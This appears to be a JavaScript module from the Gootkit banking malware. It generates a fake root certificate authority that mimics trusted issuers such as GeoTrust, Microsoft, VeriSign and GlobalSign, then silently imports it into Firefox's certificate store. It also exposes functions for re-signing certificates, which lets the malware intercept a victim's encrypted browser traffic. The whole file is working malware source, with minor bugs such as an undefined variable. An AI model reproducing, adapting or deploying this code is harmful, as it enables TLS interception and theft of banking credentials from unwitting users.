
var certgen = process.binding("certgen");
var gootkit_spyware = require("spyware");

var suspend = require('suspend'),
    resume = suspend.resume;



var possibleCerts = [
    {
        name : 'GeoTrust Global CA',
        str : [
            'CN=GeoTrust Global CA',
            'O="GeoTrust Inc."',
            'C=US'
        ].join(', ')
    },{
        name : 'AddTrust External CA Root',
        str : [
            'CN=AddTrust External CA Root',
            'OU="AddTrust External TTP Network"',
            'O=AddTrust AB',
            'C=SE'
        ].join(', ')
    },{
        name : 'Class 2 Primary CA',
        str : [
            'CN=Class 2 Primary CA',
            'O=Certplus',
            'C=FR'
        ].join(', ')
    },{
        name : 'Microsoft Root Authority',
        str : [
            'CN=Microsoft Root Authority',
            'OU=Microsoft Corporation',
            'OU="Copyright (c) 1997 Microsoft Corp."'
        ].join(', ')
    },{
        name : 'Go Daddy Class 2 Certification Authority',
        str : [
            'CN=Go Daddy Class 2 Certification Authority',
            'O=" The Go Daddy Group, Inc."',
            'C=US'
        ].join(', ')
    },{
        name : 'Thawte Premium Server CA',
        str : [
            'E="premium-server@thawte.com"',
            'CN=Thawte Premium Server CA',
            'OU=Certification Services Division',
            'O=Thawte Consulting cc',
            'L=Cape Town',
            'S=Western Cape',
            'C=ZA'
        ].join(', ')
    },{
        name : 'VeriSign Trust Network',
        str : [
            'CN=VeriSign Trust Network',
            'OU=VeriSign Trust Network',
            'OU="(c) 1998 VeriSign, Inc. - For authorized use only"',
            'OU="Class 3 Public Primary Certification Authority - G2"',
            'O="VeriSign, Inc."',
            'C=US'
        ].join(', ')
    },{
        name : 'StartCom Certification Authority',
        str : [
            'CN=StartCom Certification Authority',
            'OU=Secure Digital Certificate Signing',
            'O="StartCom Ltd."',
            'C=IL'
        ].join(', ')
    },{
        name : 'RSA Security 2048 V3',
        str : [
            'CN=RSA Security 2048 V3',
            'OU=RSA Security 2048 V3',
            'O=RSA Security Inc'
        ].join(', ')
    },{
        name : 'GTE CyberTrust Global Root',
        str : [
            'CN=RGTE CyberTrust Global Root',
            'OU="GTE CyberTrust Solutions, Inc."',
            'O=GTE Corporation',
            'C=US'
        ].join(', ')
    },{
        name : 'GlobalSign Root CA',
        str : [
            'CN=GlobalSign Root CA',
            'OU=Root CA',
            'O=GlobalSign nv-sa',
            'C=BE'
        ].join(', ')
    }
];

function installFirefoxCertificate(certificate, cb)
{
    if (certgen.firefoxIsDbInitialized()) {

        certgen.firefoxImportCert(
            pemToDer(encodedCert),
            process.md5(encodedCert));

        
        cb();
    }
}

function pemToDer(encodedCert){
    var a = encodedCert.trim().split('\r\n');
    a.pop();
    a.splice(0, 1);
    return new Buffer(a.join(), 'base64');
}

function sleep(ms, cb)
{
    setTimeout(function(){cb()},ms);
}


var installRootCACertificate = suspend(function*(cb) {

    var expectedCert = possibleCerts.randomElement();

    var existentCACert = certgen.isCAKeyExists();
    
    if(false === existentCACert)
    {
        var expectedCert = possibleCerts.randomElement();

        var genResult = yield certgen.generateRootCert(
            expectedCert.name, 
            expectedCert.str, 
            false, 
            resume());
    }

    if(false !== existentCACert)
    {
        if(process.currentBinary === 'firefox.exe')
        {
            while(!certgen.firefoxIsDbInitialized()){
                yield sleep(100, resume());
            }
     
            certgen.firefoxImportCert(
                pemToDer(existentCACert), 
                process.md5(existentCACert)
            );
        }

        cb();
    }
    else
    {
        setTimeout(function(){
            installRootCACertificate(cb)}, 2000);
    }
});

exports.pemToDer = pemToDer;
exports.firefoxIsDbInitialized =  certgen.firefoxIsDbInitialized;
exports.firefoxImportCert = certgen.firefoxImportCert;
exports.isCAKeyExists = certgen.isCAKeyExists;
exports.generateValidCertSignedByMagic = certgen.generateValidCertSignedByMagic;
exports.generateRootCert  = certgen.generateRootCert;
exports.resignCertByMagic = certgen.resignCertByMagic;
exports.installRootCACertificate = installRootCACertificate;
exports.installFirefoxCertificate = installFirefoxCertificate;